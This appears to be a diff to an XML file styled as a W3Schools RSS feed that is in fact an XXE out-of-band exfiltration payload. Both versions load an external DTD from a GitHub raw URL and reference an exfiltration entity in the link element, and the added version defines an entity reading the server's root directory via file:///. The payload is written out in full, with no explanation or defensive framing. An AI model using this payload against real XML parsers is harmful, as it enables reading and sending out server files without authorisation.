@@ -1,15 +1,12 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
-%sp;
-%param1;
-%exfil;
-]>
+<!DOCTYPE roottag [ 
+ <!ENTITY % file SYSTEM "file:///">
+ <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd"> 
+%dtd;]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
-  <link>&exfil;</link>
+  <link>&send;</link>
   <description>Free web building tutorials</description>
   <item>
     <title>aaaaaa</title>
